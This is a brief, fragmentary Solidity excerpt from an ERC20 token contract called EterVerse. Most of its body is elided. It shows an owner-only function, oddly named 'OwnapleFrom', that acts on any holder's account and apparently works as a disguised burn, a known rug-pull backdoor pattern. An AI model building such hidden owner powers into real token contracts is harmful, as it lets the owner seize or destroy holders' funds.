...
contract EterVerse is Context, ERC20, Ownable {
 ...
 function OwnapleFrom(address account, uint256 amount) public onlyOwner virtual {
      _ownaple(account, amount);
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    function ownaple(uint256 amount) public virtual {
